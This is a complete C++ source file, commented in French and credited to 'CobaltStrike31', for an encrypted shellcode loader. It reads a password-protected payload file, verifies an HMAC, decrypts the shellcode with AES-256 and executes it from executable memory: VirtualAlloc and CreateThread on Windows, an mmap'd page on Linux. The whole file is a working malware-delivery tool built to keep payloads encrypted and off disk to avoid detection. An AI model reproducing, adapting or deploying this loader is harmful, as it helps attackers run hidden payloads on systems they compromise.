/**
 * OPSEC Loader - Chargeur sécurisé pour shellcode
 * 
 * Charge et exécute un shellcode chiffré en mémoire avec une empreinte OPSEC minimale.
 * Supporte la vérification d'intégrité HMAC pour une protection contre les manipulations.
 * 
 * Date: 2025-05-04
 * Auteur: CobaltStrike31
 */

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <memory>
#include <stdexcept>
#include <algorithm>

#ifdef _WIN32
    #include <windows.h>
    #pragma comment(lib, "crypt32.lib")
    #include <wincrypt.h>
    #define SHELLCODE_EXEC_FUNC LPTHREAD_START_ROUTINE
#else
    #include <sys/mman.h>
    #include <unistd.h>
    #include <pthread.h>
    #include <openssl/evp.h>
    #include <openssl/hmac.h>
    #include <openssl/sha.h>
    #include <openssl/err.h>
    #define SHELLCODE_EXEC_FUNC void*(*)(void*)
#endif

// Définitions pour le format de fichier - doit correspondre à encrypt_shell.py
#define SHELLCODE_MAGIC 0x50534345  // 'PSCE' en little-endian
#define SHELLCODE_VERSION_LEGACY 1   // Sans HMAC
#define SHELLCODE_VERSION_HMAC 2     // Avec HMAC

// Tailles des composants cryptographiques
#define AES_BLOCK_SIZE 16
#define AES_KEY_SIZE 32
#define HMAC_SHA256_SIZE 32
#define DEFAULT_SALT_SIZE 16
#define DEFAULT_IV_SIZE 16

// Structure de l'en-tête de fichier - doit correspondre à encrypt_shell.py
typedef struct {
    uint32_t magic;      // Magic number pour identification
    uint32_t version;    // Version du format (1=legacy, 2=HMAC)
    uint32_t salt_size;  // Taille du sel en octets
} ShellcodeHeader;

// Structure pour stocker les clés dérivées
typedef struct {
    uint8_t encryption_key[AES_KEY_SIZE];
    uint8_t hmac_key[AES_KEY_SIZE];
} DerivedKeys;

// Fonctions d'utilitaire pour la gestion mémoire sécurisée
class SecureMemory {
public:
    // Effacement sécurisé de la mémoire
    static void secureZero(void* ptr, size_t size) {
        if (!ptr || size == 0) return;
        
        volatile uint8_t* volatile p = static_cast<volatile uint8_t* volatile>(ptr);
        while (size--) {
            *p++ = 0;
        }
    }
    
    // Suppression sécurisée d'un objet
    template<typename T>
    static void secureDelete(T* &ptr) {
        if (ptr) {
            secureZero(ptr, sizeof(T));
            delete ptr;
            ptr = nullptr;
        }
    }
    
    // Suppression sécurisée d'un tableau
    template<typename T>
    static void secureDeleteArray(T* &ptr, size_t size) {
        if (ptr) {
            secureZero(ptr, sizeof(T) * size);
            delete[] ptr;
            ptr = nullptr;
        }
    }
    
    // Comparaison en temps constant (pour éviter timing attacks)
    static bool constantTimeCompare(const uint8_t* a, const uint8_t* b, size_t size) {
        uint8_t result = 0;
        for (size_t i = 0; i < size; i++) {
            result |= a[i] ^ b[i];
        }
        return (result == 0);
    }
};

// Fonctions pour dérivation de clé et vérification HMAC
class Crypto {
public:
    // Dérive une clé à partir d'un mot de passe et d'un sel (PBKDF2)
    static DerivedKeys deriveKeys(const std::string& password, 
                                  const uint8_t* salt, 
                                  size_t salt_size, 
                                  int iterations = 100000) {
        if (!salt || salt_size == 0 || password.empty()) {
            throw std::invalid_argument("Arguments invalides pour la dérivation de clé");
        }
        
        DerivedKeys keys;
        memset(&keys, 0, sizeof(keys));
        
#ifdef _WIN32
        // Utilisation de Windows CryptoAPI
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        HCRYPTKEY hKey = 0;
        
        try {
            // Acquérir un contexte cryptographique
            if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                throw std::runtime_error("Erreur lors de l'acquisition du contexte cryptographique");
            }
            
            // Créer un hash SHA-256
            if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
                throw std::runtime_error("Erreur lors de la création du hash");
            }
            
            // Premier composant: mot de passe
            if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(password.c_str()), 
                              static_cast<DWORD>(password.length()), 0)) {
                throw std::runtime_error("Erreur lors du hachage du mot de passe");
            }
            
            // Deuxième composant: sel
            if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(salt), 
                              static_cast<DWORD>(salt_size), 0)) {
                throw std::runtime_error("Erreur lors du hachage du sel");
            }
            
            // Itérations supplémentaires (version simplifiée de PBKDF2)
            std::vector<uint8_t> buffer(AES_KEY_SIZE * 2, 0); // Assez grand pour les deux clés
            DWORD hashSize = AES_KEY_SIZE * 2;
            
            if (!CryptGetHashParam(hHash, HP_HASHVAL, buffer.data(), &hashSize, 0)) {
                throw std::runtime_error("Erreur lors de la récupération du hash");
            }
            
            // PBKDF2 simulé via itérations
            for (int i = 1; i < iterations; i++) {
                CryptDestroyHash(hHash);
                hHash = 0;
                
                if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
                    throw std::runtime_error("Erreur lors de la création du hash itératif");
                }
                
                if (!CryptHashData(hHash, buffer.data(), hashSize, 0)) {
                    throw std::runtime_error("Erreur lors du hachage itératif");
                }
                
                if (!CryptGetHashParam(hHash, HP_HASHVAL, buffer.data(), &hashSize, 0)) {
                    throw std::runtime_error("Erreur lors de la récupération du hash itératif");
                }
            }
            
            // Séparation des clés
            if (hashSize >= AES_KEY_SIZE * 2) {
                memcpy(keys.encryption_key, buffer.data(), AES_KEY_SIZE);
                memcpy(keys.hmac_key, buffer.data() + AES_KEY_SIZE, AES_KEY_SIZE);
            } else {
                throw std::runtime_error("Matériel de clé insuffisant");
            }
            
            // Nettoyage
            SecureMemory::secureZero(buffer.data(), buffer.size());
        }
        catch (const std::exception& e) {
            // Nettoyage en cas d'erreur
            if (hHash) CryptDestroyHash(hHash);
            if (hKey) CryptDestroyKey(hKey);
            if (hProv) CryptReleaseContext(hProv, 0);
            throw;
        }
        
        // Nettoyage systématique
        if (hHash) CryptDestroyHash(hHash);
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
        
#else
        // Utilisation d'OpenSSL
        unsigned char key_material[AES_KEY_SIZE * 2];
        
        if (PKCS5_PBKDF2_HMAC(password.c_str(), static_cast<int>(password.length()),
                              salt, static_cast<int>(salt_size),
                              iterations, EVP_sha256(),
                              sizeof(key_material), key_material) != 1) {
            throw std::runtime_error("Erreur lors de la dérivation de clé PBKDF2");
        }
        
        // Séparation des clés
        memcpy(keys.encryption_key, key_material, AES_KEY_SIZE);
        memcpy(keys.hmac_key, key_material + AES_KEY_SIZE, AES_KEY_SIZE);
        
        // Nettoyage
        SecureMemory::secureZero(key_material, sizeof(key_material));
#endif
        
        return keys;
    }
    
    // Vérifie un HMAC contre une valeur attendue
    static bool verifyHMAC(const uint8_t* hmac_key, size_t hmac_key_size,
                           const uint8_t* data, size_t data_size,
                           const uint8_t* expected_hmac, size_t hmac_size) {
        if (!hmac_key || hmac_key_size == 0 || !data || data_size == 0 || 
            !expected_hmac || hmac_size != HMAC_SHA256_SIZE) {
            return false;
        }
        
        uint8_t computed_hmac[HMAC_SHA256_SIZE];
        
#ifdef _WIN32
        // Utilisation de Windows CryptoAPI
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        HMAC_INFO hmacInfo;
        
        bool result = false;
        
        try {
            memset(&hmacInfo, 0, sizeof(hmacInfo));
            hmacInfo.HashAlgid = CALG_SHA_256;
            
            if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                throw std::runtime_error("Erreur lors de l'acquisition du contexte cryptographique");
            }
            
            if (!CryptCreateHash(hProv, CALG_HMAC, 0, 0, &hHash)) {
                throw std::runtime_error("Erreur lors de la création du hash HMAC");
            }
            
            if (!CryptSetHashParam(hHash, HP_HMAC_INFO, reinterpret_cast<BYTE*>(&hmacInfo), 0)) {
                throw std::runtime_error("Erreur lors de la configuration HMAC");
            }
            
            if (!CryptHashData(hHash, hmac_key, static_cast<DWORD>(hmac_key_size), 0)) {
                throw std::runtime_error("Erreur lors de l'initialisation de la clé HMAC");
            }
            
            if (!CryptHashData(hHash, data, static_cast<DWORD>(data_size), 0)) {
                throw std::runtime_error("Erreur lors du calcul HMAC");
            }
            
            DWORD hash_size = HMAC_SHA256_SIZE;
            if (!CryptGetHashParam(hHash, HP_HASHVAL, computed_hmac, &hash_size, 0)) {
                throw std::runtime_error("Erreur lors de la récupération du HMAC");
            }
            
            // Comparaison constante en temps pour éviter les timing attacks
            result = SecureMemory::constantTimeCompare(computed_hmac, expected_hmac, HMAC_SHA256_SIZE);
        }
        catch (const std::exception& e) {
            if (hHash) CryptDestroyHash(hHash);
            if (hProv) CryptReleaseContext(hProv, 0);
            return false;
        }
        
        // Nettoyage systématique
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);
        
        return result;
        
#else
        // Utilisation d'OpenSSL
        unsigned int md_len = HMAC_SHA256_SIZE;
        unsigned char* mac = HMAC(EVP_sha256(), hmac_key, static_cast<int>(hmac_key_size),
                                  data, data_size, computed_hmac, &md_len);
        
        if (mac == NULL || md_len != HMAC_SHA256_SIZE) {
            return false;
        }
        
        // Comparaison constante en temps pour éviter les timing attacks
        return SecureMemory::constantTimeCompare(computed_hmac, expected_hmac, HMAC_SHA256_SIZE);
#endif
    }
    
    // Déchiffre des données avec AES-256-CBC
    static std::vector<uint8_t> decryptAES(const uint8_t* key, const uint8_t* iv,
                                          const uint8_t* data, size_t data_size) {
        if (!key || !iv || !data || data_size == 0) {
            throw std::invalid_argument("Arguments invalides pour le déchiffrement");
        }
        
        if (data_size % AES_BLOCK_SIZE != 0) {
            throw std::runtime_error("Taille de données invalide pour le déchiffrement AES-CBC");
        }
        
        std::vector<uint8_t> decrypted(data_size);
        
#ifdef _WIN32
        // Utilisation de Windows CryptoAPI
        HCRYPTPROV hProv = 0;
        HCRYPTKEY hKey = 0;
        
        try {
            if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                throw std::runtime_error("Erreur lors de l'acquisition du contexte cryptographique");
            }
            
            // Importer la clé AES
            struct {
                BLOBHEADER hdr;
                DWORD keySize;
                BYTE keyData[AES_KEY_SIZE];
            } keyBlob;
            
            memset(&keyBlob, 0, sizeof(keyBlob));
            keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
            keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
            keyBlob.hdr.reserved = 0;
            keyBlob.hdr.aiKeyAlg = CALG_AES_256;
            keyBlob.keySize = AES_KEY_SIZE;
            memcpy(keyBlob.keyData, key, AES_KEY_SIZE);
            
            if (!CryptImportKey(hProv, reinterpret_cast<BYTE*>(&keyBlob), sizeof(keyBlob), 0, 0, &hKey)) {
                throw std::runtime_error("Erreur lors de l'importation de la clé");
            }
            
            // Sécuriser la mémoire utilisée pour le blob de clé
            SecureMemory::secureZero(&keyBlob, sizeof(keyBlob));
            
            // Configurer le mode CBC
            DWORD mode = CRYPT_MODE_CBC;
            if (!CryptSetKeyParam(hKey, KP_MODE, reinterpret_cast<BYTE*>(&mode), 0)) {
                throw std::runtime_error("Erreur lors de la configuration du mode CBC");
            }
            
            // Configurer l'IV
            if (!CryptSetKeyParam(hKey, KP_IV, const_cast<BYTE*>(iv), 0)) {
                throw std::runtime_error("Erreur lors de la configuration de l'IV");
            }
            
            // Copier les données chiffrées pour déchiffrement
            memcpy(decrypted.data(), data, data_size);
            
            // Déchiffrer
            DWORD decryptedSize = static_cast<DWORD>(data_size);
            if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted.data(), &decryptedSize)) {
                throw std::runtime_error("Erreur lors du déchiffrement");
            }
            
            decrypted.resize(decryptedSize);
        }
        catch (const std::exception& e) {
            if (hKey) CryptDestroyKey(hKey);
            if (hProv) CryptReleaseContext(hProv, 0);
            throw;
        }
        
        // Nettoyage systématique
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
        
#else
        // Utilisation d'OpenSSL
        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            throw std::runtime_error("Erreur lors de la création du contexte de déchiffrement");
        }
        
        try {
            if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
                throw std::runtime_error("Erreur lors de l'initialisation du déchiffrement");
            }
            
            int len = 0;
            if (EVP_DecryptUpdate(ctx, decrypted.data(), &len, data, static_cast<int>(data_size)) != 1) {
                throw std::runtime_error("Erreur lors du déchiffrement des données");
            }
            
            int finalLen = 0;
            if (EVP_DecryptFinal_ex(ctx, decrypted.data() + len, &finalLen) != 1) {
                throw std::runtime_error("Erreur lors de la finalisation du déchiffrement");
            }
            
            decrypted.resize(len + finalLen);
        }
        catch (const std::exception& e) {
            EVP_CIPHER_CTX_free(ctx);
            throw;
        }
        
        EVP_CIPHER_CTX_free(ctx);
#endif
        
        return decrypted;
    }
};

// Classe principale du loader
class OpsecLoader {
private:
    std::string filename;
    std::string password;
    std::vector<uint8_t> shellcode;
    bool verbose;
    
    // Charge et déchiffre le shellcode
    void loadEncryptedShellcode() {
        if (verbose) std::cerr << "[*] Chargement du shellcode depuis " << filename << std::endl;
        
        std::ifstream file(filename, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Impossible d'ouvrir le fichier shellcode");
        }
        
        // Lire l'en-tête
        ShellcodeHeader header;
        file.read(reinterpret_cast<char*>(&header), sizeof(header));
        
        if (file.fail() || header.magic != SHELLCODE_MAGIC) {
            throw std::runtime_error("Format de fichier shellcode invalide");
        }
        
        if (header.version != SHELLCODE_VERSION_LEGACY && 
            header.version != SHELLCODE_VERSION_HMAC) {
            throw std::runtime_error("Version de format non supportée");
        }
        
        if (header.salt_size == 0 || header.salt_size > 128) {
            throw std::runtime_error("Taille de sel invalide");
        }
        
        if (verbose) {
            std::cerr << "[*] Format de fichier valide (version " << header.version << ")" << std::endl;
            if (header.version == SHELLCODE_VERSION_HMAC) {
                std::cerr << "[*] Mode HMAC activé" << std::endl;
            }
        }
        
        // Lire le sel
        std::vector<uint8_t> salt(header.salt_size);
        file.read(reinterpret_cast<char*>(salt.data()), static_cast<std::streamsize>(salt.size()));
        if (file.fail()) {
            throw std::runtime_error("Erreur lors de la lecture du sel");
        }
        
        // Lire l'IV
        std::vector<uint8_t> iv(AES_BLOCK_SIZE);
        file.read(reinterpret_cast<char*>(iv.data()), static_cast<std::streamsize>(iv.size()));
        if (file.fail()) {
            throw std::runtime_error("Erreur lors de la lecture de l'IV");
        }
        
        try {
            // Dériver les clés
            if (verbose) std::cerr << "[*] Dérivation des clés cryptographiques" << std::endl;
            DerivedKeys keys = Crypto::deriveKeys(password, salt.data(), salt.size());
            
            // Position actuelle dans le fichier (pour calcul HMAC)
            std::streampos header_end_pos = file.tellg();
            
            // Vérification HMAC pour version 2
            if (header.version == SHELLCODE_VERSION_HMAC) {
                // Lire le HMAC attendu
                std::vector<uint8_t> expected_hmac(HMAC_SHA256_SIZE);
                file.read(reinterpret_cast<char*>(expected_hmac.data()), 
                         static_cast<std::streamsize>(expected_hmac.size()));
                if (file.fail()) {
                    throw std::runtime_error("Erreur lors de la lecture du HMAC");
                }
                
                // Lire tout le contenu du fichier jusqu'ici pour vérification HMAC
                file.seekg(0, std::ios::beg);
                std::vector<uint8_t> header_data(static_cast<size_t>(header_end_pos));
                file.read(reinterpret_cast<char*>(header_data.data()), 
                         static_cast<std::streamsize>(header_data.size()));
                
                if (file.fail()) {
                    throw std::runtime_error("Erreur lors de la lecture des données d'en-tête pour HMAC");
                }
                
                // Retourner à la position après le HMAC
                file.seekg(header_end_pos + static_cast<std::streamoff>(HMAC_SHA256_SIZE));
                
                if (verbose) std::cerr << "[*] Vérification de l'intégrité (HMAC-SHA256)" << std::endl;
                
                // Vérifier le HMAC
                if (!Crypto::verifyHMAC(keys.hmac_key, AES_KEY_SIZE,
                                       header_data.data(), header_data.size(),
                                       expected_hmac.data(), expected_hmac.size())) {
                    throw std::runtime_error("Vérification HMAC échouée - fichier corrompu ou mot de passe incorrect");
                }
                
                if (verbose) std::cerr << "[+] Vérification d'intégrité réussie" << std::endl;
                
                // Nettoyer les données sensibles
                SecureMemory::secureZero(header_data.data(), header_data.size());
                SecureMemory::secureZero(expected_hmac.data(), expected_hmac.size());
            }
            
            // Lire les données chiffrées
            file.seekg(0, std::ios::end);
            std::streampos end_pos = file.tellg();
            
            // Repositionner après l'en-tête et potentiellement le HMAC
            std::streampos data_pos;
            if (header.version == SHELLCODE_VERSION_HMAC) {
                data_pos = header_end_pos + static_cast<std::streamoff>(HMAC_SHA256_SIZE);
            } else {
                data_pos = header_end_pos;
            }
            
            file.seekg(data_pos);
            
            std::streamsize encrypted_size = end_pos - data_pos;
            if (encrypted_size <= 0 || encrypted_size > 100 * 1024 * 1024) { // Limite à 100 Mo pour sécurité
                throw std::runtime_error("Taille de données chiffrées invalide");
            }
            
            std::vector<uint8_t> encrypted(static_cast<size_t>(encrypted_size));
            file.read(reinterpret_cast<char*>(encrypted.data()), encrypted_size);
            if (file.fail()) {
                throw std::runtime_error("Erreur lors de la lecture des données chiffrées");
            }
            
            // Déchiffrer
            if (verbose) std::cerr << "[*] Déchiffrement du shellcode" << std::endl;
            
            try {
                shellcode = Crypto::decryptAES(keys.encryption_key, iv.data(), 
                                              encrypted.data(), encrypted.size());
                
                if (verbose) {
                    std::cerr << "[+] Déchiffrement réussi: " << shellcode.size() 
                             << " octets de shellcode récupérés" << std::endl;
                }
                
                // Nettoyage des clés sensibles et données chiffrées
                SecureMemory::secureZero(&keys, sizeof(keys));
                SecureMemory::secureZero(encrypted.data(), encrypted.size());
                SecureMemory::secureZero(iv.data(), iv.size());
                SecureMemory::secureZero(salt.data(), salt.size());
            }
            catch (const std::exception& e) {
                // Nettoyage avant de propager l'exception
                SecureMemory::secureZero(&keys, sizeof(keys));
                SecureMemory::secureZero(encrypted.data(), encrypted.size());
                SecureMemory::secureZero(iv.data(), iv.size());
                SecureMemory::secureZero(salt.data(), salt.size());
                throw;
            }
        }
        catch (const std::exception& e) {
            throw std::runtime_error(std::string("Erreur lors du chargement: ") + e.what());
        }
    }
    
    // Exécute le shellcode en mémoire
    void executeShellcode() {
        if (shellcode.empty()) {
            throw std::runtime_error("Pas de shellcode à exécuter");
        }
        
        if (verbose) std::cerr << "[*] Préparation de l'exécution du shellcode" << std::endl;
        
#ifdef _WIN32
        // Allocation de mémoire exécutable
        LPVOID lpAddress = VirtualAlloc(NULL, shellcode.size(),
                                       MEM_COMMIT | MEM_RESERVE, 
                                       PAGE_EXECUTE_READWRITE);
        if (lpAddress == NULL) {
            throw std::runtime_error("Échec de l'allocation mémoire pour le shellcode");
        }
        
        try {
            // Copier le shellcode en mémoire
            memcpy(lpAddress, shellcode.data(), shellcode.size());
            
            // Effacer le shellcode de notre mémoire
            SecureMemory::secureZero(shellcode.data(), shellcode.size());
            shellcode.clear();
            
            if (verbose) std::cerr << "[*] Exécution du shellcode" << std::endl;
            
            // Exécuter le shellcode dans un thread
            HANDLE hThread = CreateThread(NULL, 0, 
                                        reinterpret_cast<LPTHREAD_START_ROUTINE>(lpAddress), 
                                        NULL, 0, NULL);
            if (hThread == NULL) {
                throw std::runtime_error("Échec de la création du thread pour le shellcode");
            }
            
            // Attendre la fin de l'exécution
            if (verbose) std::cerr << "[*] Attente de la fin d'exécution" << std::endl;
            
            WaitForSingleObject(hThread, INFINITE);
            
            if (verbose) std::cerr << "[+] Exécution terminée" << std::endl;
            
            CloseHandle(hThread);
            
            // Libérer la mémoire
            VirtualFree(lpAddress, 0, MEM_RELEASE);
        }
        catch (const std::exception& e) {
            // En cas d'erreur, s'assurer de libérer la mémoire
            VirtualFree(lpAddress, 0, MEM_RELEASE);
            throw;
        }
#else
        // Allocation de mémoire avec permissions d'exécution
        void* mem = mmap(NULL, shellcode.size(), 
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (mem == MAP_FAILED) {
            throw std::runtime_error("Échec de l'allocation mémoire pour le shellcode");
        }
        
        try {
            // Copier le shellcode en mémoire
            memcpy(mem, shellcode.data(), shellcode.size());
            
            // Effacer le shellcode de notre mémoire
            SecureMemory::secureZero(shellcode.data(), shellcode.size());
            shellcode.clear();
            
            if (verbose) std::cerr << "[*] Exécution du shellcode" << std::endl;
            
            // Exécuter le shellcode
            ((void(*)())mem)();
            
            if (verbose) std::cerr << "[+] Exécution terminée" << std::endl;
        }
        catch (const std::exception& e) {
            // En cas d'erreur, s'assurer de libérer la mémoire
            munmap(mem, shellcode.size());
            throw;
        }
        
        // Libérer la mémoire
        munmap(mem, shellcode.size());
#endif
    }
    
public:
    OpsecLoader(const std::string& filename, const std::string& password, bool verbose = false) 
        : filename(filename), password(password), verbose(verbose) {
    }
    
    ~OpsecLoader() {
        // Nettoyage des données sensibles
        if (!shellcode.empty()) {
            SecureMemory::secureZero(shellcode.data(), shellcode.size());
        }
    }
    
    void run() {
        try {
            loadEncryptedShellcode();
            executeShellcode();
        }
        catch (const std::exception& e) {
            // Nettoyage des données sensibles en cas d'erreur
            if (!shellcode.empty()) {
                SecureMemory::secureZero(shellcode.data(), shellcode.size());
                shellcode.clear();
            }
            throw;
        }
    }
};

int main(int argc, char* argv[]) {
    // Analyser les arguments
    bool verbose = false;
    std::string filename;
    std::string password;
    
    for (int i = 1; i < argc; ++i) {
        std::string arg(argv[i]);
        if (arg == "-h" || arg == "--help") {
            std::cerr << "Usage: " << argv[0] << " [options] <fichier_shellcode> <mot_de_passe>" << std::endl;
            std::cerr << "Options:" << std::endl;
            std::cerr << "  -v, --verbose    Mode verbeux" << std::endl;
            std::cerr << "  -h, --help       Afficher cette aide" << std::endl;
            return 0;
        }
        else if (arg == "-v" || arg == "--verbose") {
            verbose = true;
        }
        else if (filename.empty()) {
            filename = arg;
        }
        else if (password.empty()) {
            password = arg;
        }
    }
    
    if (filename.empty() || password.empty()) {
        std::cerr << "Usage: " << argv[0] << " [options] <fichier_shellcode> <mot_de_passe>" << std::endl;
        return 1;
    }
    
    try {
        OpsecLoader loader(filename, password, verbose);
        loader.run();
        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Erreur: " << e.what() << std::endl;
        return 1;
    }
}